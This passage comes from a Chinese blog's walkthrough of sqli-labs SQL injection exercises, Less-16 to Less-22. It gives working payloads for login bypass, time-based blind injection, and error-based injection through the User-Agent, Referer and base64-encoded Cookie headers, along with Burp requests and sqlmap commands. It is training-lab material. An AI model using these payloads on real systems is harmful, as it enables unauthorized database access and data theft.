\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结</h2>\n<hr>\n<h1 id=\"less-16\"><a class=\"markdownIt-Anchor\" href=\"#less-16\">#</a> Less-16</h1>\n<p>date：2020-11-21 22:33:47</p>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h2>\n<h3 id=\"sqlmap-16\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-16\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-16\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-16\">#</a> 手工注入</h3>\n<p>username 输入 <code>admin&quot;) or 1=1 -- </code> 直接登录成功，不要忘记–后面的空格哈</p>\n<p>因为可以根据图片的显示判断，所以其实时间盲注还是布尔盲注都是可以的呀，只是前面那道题用过布尔盲注了，这里就用时间盲注</p>\n<p>老规矩先判断数据库长度是 8：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&quot;) and length(database())=8 -- </span><br></pre></td></tr></table></figure>\n<p>然后搬砖找 bp，send to Intruder：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&quot;) and if(ascii(substr(database(),§1§,1))=§8§,slepp(23),1)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结</h2>\n<p>bp 真好，sqlmap 真好，搬砖真难</p>\n<hr>\n<h1 id=\"less-17sqlmaping\"><a class=\"markdownIt-Anchor\" href=\"#less-17sqlmaping\">#</a> Less-17（sqlmaping）</h1>\n<p>date：2020-11-21 22:54:56</p>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h2>\n<p>看见题目又开心了起来，不是盲注啦</p>\n<h3 id=\"sqlmap-17\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-17\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 17.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 17.txt --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-17\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-17\">#</a> 手工注入</h3>\n<p>username 输入 <code>admin' or 1=1 -- </code></p>\n<p>竟然返回 bug off，you silly dump hacker</p>\n<p>哦豁，骂我，我要干你，等着</p>\n<p>我怀疑后台判断了用户输入，然后无数次尝试无数次被骂，我决定偷偷看一下源码</p>\n<p>源码中对 uname 限制了只能 15 个字符，单是这个就已经很无力了，后来看完源码才发现这是一个重置密码的表单，而且源码中并没有对 passwd 做限制</p>\n<p>眼瞎的我决定用时间盲注，bp send to repeater：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&amp;passwd=1&#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>哈哈 服务器睡着啦，随后时间盲注就可以了，和上面的题目一样</p>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结</h2>\n<p>感觉用得多的还是盲注</p>\n<p>盲注手工注入最快就是用二分法，但是我是有 bp 的人！</p>\n<ol>\n<li>–risk=RISK 风险（1-4，默认 1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试；risk 3：or 语句的测试；risk 4：update 的测试</li>\n</ol>\n<hr>\n<h1 id=\"less-18\"><a class=\"markdownIt-Anchor\" href=\"#less-18\">#</a> Less-18</h1>\n<p>date：2020-11-22 00:19:07</p>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h2>\n<p>题目提示，Your IP ADDRESS is: 127.0.0.1，这题我会！肯定是 xff 头注入！（结果不是）</p>\n<h3 id=\"sqlmap-18\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-18\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 18.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-18\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-18\">#</a> 手工注入</h3>\n<p>既然不是 xff 头，那就看一下源码把</p>\n<p>源码中对账户密码进行了判断，必须要绕过去才能进行头注入，刚好上一题重置了密码</p>\n<p>那么就输入相应的账户密码，再在 user-agent 上注入就好啦，先来个单引号报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>讲道理这里肯定是插入操作，那就是 insert 注入咯，源码确实是 insert，其实不管是什么注入，只要能大概弄 sql 语句，顺利让数据库执行我们的代码即可</p>\n<p>拿 database () 这里利用报错注入，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出，拿到当前数据库 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))#&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后面爆字段值同 less-11，改一下 payload 即可</p>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结</h2>\n<p>看源码，就像考试作弊，心怀愧疚～～（跃跃欲试）~~</p>\n<ol>\n<li>level 参数：</li>\n</ol>\n<blockquote>\n<p>1 &gt; 探测等级： --level 5</p>\n<p>–level 5 指的是需要执行的测试等级</p>\n<p>一共有 5 个等级（1-5） 不加 level 时，默认是 1</p>\n<p>5 级包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>在不能确定哪个 payload 或参数为注入点时，建议使用高的 level 值。</p>\n</blockquote>\n<hr>\n<h1 id=\"less-19\"><a class=\"markdownIt-Anchor\" href=\"#less-19\">#</a> Less-19</h1>\n<p>date：2020-11-22 10:01:30</p>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h2>\n<h3 id=\"sqlmap-19\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-19\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 19.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-19\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-19\">#</a> 手工注入</h3>\n<p>看标题，referer 注入，看来后面的题目都是头注入了</p>\n<p>打开 hackbar，点击 post data，输入正确的用户名密码，提示我的 referer 是啥啥啥，再次确定就是 referer 头注入</p>\n<p>不知道为啥 hackbar 同时搞 postdata 和 referer，referer 没有起作用，上 bp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>又是 insert 操作啦，利用报错注入 extractvalue () 拿当前数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit </span><br></pre></td></tr></table></figure>\n<p>根据输出，拿到当前数据库名 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) #&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后续操作同 less-11</p>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结</h2>\n<p>sqlmap 新操作，感觉它不太行了？应该是我不太行，去百度 sqlmap 的使用姿势</p>\n<hr>\n<h1 id=\"less-20\"><a class=\"markdownIt-Anchor\" href=\"#less-20\">#</a> Less-20</h1>\n<p>date：2020-11-22 10:17:02</p>\n<h2 id=\"过程-20\"><a class=\"markdownIt-Anchor\" href=\"#过程-20\">#</a> 过程</h2>\n<h3 id=\"sqlmap-20\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-20\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 20.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-20\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-20\">#</a> 手工注入</h3>\n<p>先用 admin\\1 登录</p>\n<p>题目给了我的 cookie：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>那就 cookie 注入呗，bp 抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>cookie 后单引号开战</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>后面的 sql 橘子拿到了，就开始常规姿势闭合，拿 database ()</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())) # </span><br></pre></td></tr></table></figure>\n<p>输出，拿到库名 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿字段内容同 less-11</p>\n<h2 id=\"总结-20\"><a class=\"markdownIt-Anchor\" href=\"#总结-20\">#</a> 总结</h2>\n<p>报错注入真好用</p>\n<p>前面写了题，后面就越写越快了，开心</p>\n<hr>\n<h1 id=\"less-21\"><a class=\"markdownIt-Anchor\" href=\"#less-21\">#</a> Less-21</h1>\n<p>date：2020-11-22 10:29:18</p>\n<h2 id=\"过程-21\"><a class=\"markdownIt-Anchor\" href=\"#过程-21\">#</a> 过程</h2>\n<h3 id=\"sqlmap-21\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-21\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 21.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-21\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-21\">#</a> 手工注入</h3>\n<p>老规矩，输入 17 关重置后的账户密码 admin/1</p>\n<p>题目还是 cookie 注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>看标题是复杂版的…</p>\n<p>啊这，先试试引号，竟然不报错了！</p>\n<p>有趣</p>\n<p>看了下题目 uname 那里发生了改变，抓包发现 uname 是 YWRtaW4，改成 admin 试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&quot;</span><br></pre></td></tr></table></figure>\n<p>输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &#x27;=&#x27;</span><br></pre></td></tr></table></figure>\n<p>说是编码集的问题，好叭我去百度<a href=\"https://www.cnblogs.com/escwq/p/12264076.html\">闯关秘籍了</a></p>\n<p>对 cookie 的值进行了 base64 的处理，其他和 20 关一样</p>\n<p>也就是说在注入的时候需要把注入语句搞一下编码，打开 hackbar，打开 base64 编码，输入 admin’</p>\n<p>bp 发包设置 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=YWRtaW4n</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>拿到后面的句子，开始闭合注入，不知为何我转义后的报错注入代码放进 payload 没有反应，换一个加密工具就好了</p>\n<p>用报错注入拿数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64转义：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=设置cookie：Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿到数据库名，拿别的数据同 less-11</p>\n<h2 id=\"总结-21\"><a class=\"markdownIt-Anchor\" href=\"#总结-21\">#</a> 总结</h2>\n<p><a href=\"https://blog.csdn.net/makenothing/article/details/81155960\">base64 使用场景及原理</a></p>\n<p>base64 最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 ascii 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。</p>\n<p>因此 base64 就可以用来将二进制文件内容编码为只包含 ascii 字符的内容。</p>\n<p>我们知道在计算机中任何数据都是按 ascii 码存储的，而 ascii 码的 128～255 之间的值是不可见字符。而在网络上交换数据时，比如说从 A 地传到 B 地，往往要经过多个路由设备，由于不同的设备对字符的处理方式有一些不同，这样那些不可见字符就有可能被处理错误，这是不利于传输的。所以就先把数据先做一个 Base64 编码，统统变成可见字符，这样出错的可能性就大降低了。</p>\n<hr>\n<h1 id=\"less-22\"><a class=\"markdownIt-Anchor\" href=\"#less-22\">#</a> Less-22</h1>\n<p>date：2020-11-22 11:35:53</p>\n<h2 id=\"过程-22\"><a class=\"markdownIt-Anchor\" href=\"#过程-22\">#</a> 过程</h2>\n<h3 id=\"sqlmap-22\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-22\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 22.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-22\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-22\">#</a> 手工注入</h3>\n<p>还是用 admin\\1 登录，显示 cookie，那就还是 cookie 注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>看见 uname = YWRtaW4= ，那就应该还是用 base64 加密</p>\n<p>使用上一题的 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>发现没有报错显示，那么说明没有闭合成功，看标题是双引号闭合，那就改一下引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&quot;) and 